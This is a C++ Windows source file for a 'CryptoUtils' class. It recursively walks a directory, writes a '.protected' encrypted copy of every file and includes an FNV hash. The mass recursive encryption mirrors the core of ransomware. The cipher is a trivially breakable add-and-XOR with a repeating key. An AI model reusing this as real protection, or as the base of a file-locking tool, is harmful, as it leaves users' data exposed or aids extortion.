#include "CryptoUtils.h"
#include <windows.h>
#include <fstream>

void CryptoUtils::processDirectory(const std::string& dirPath, const std::string& key) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((dirPath + "\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        const std::string fileOrDir = findFileData.cFileName;
        if (fileOrDir == "." || fileOrDir == "..") continue;

        std::string fullPath = dirPath + "\\" + fileOrDir;
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recurse into subdirectories
            processDirectory(fullPath, key);
        } else {
            // Encrypt file
            encryptFile(fullPath, key);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

void CryptoUtils::encryptFile(const std::string& filePath, const std::string& key) {
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return;

    std::ostringstream buffer;
    buffer << inFile.rdbuf();
    std::string fileData = buffer.str();

    std::string encryptedData = encrypt(fileData, key);

    std::ofstream outFile(filePath + ".protected", std::ios::binary);
    outFile.write(encryptedData.c_str(), encryptedData.size());
}

std::string CryptoUtils::encrypt(const std::string& data, const std::string& key) {
    std::string encrypted = data;
    for (size_t i = 0; i < encrypted.size(); ++i) {
        encrypted[i] = (encrypted[i] + 3) ^ key[i % key.size()];
    }
    return encrypted;
}

std::string CryptoUtils::hash(const std::string& data) {
    uint32_t hash = 0x811c9dc5; // FNV offset basis
    for (char c : data) {
        hash ^= c;
        hash *= 0x01000193; // FNV prime
    }
    return std::to_string(hash);
}
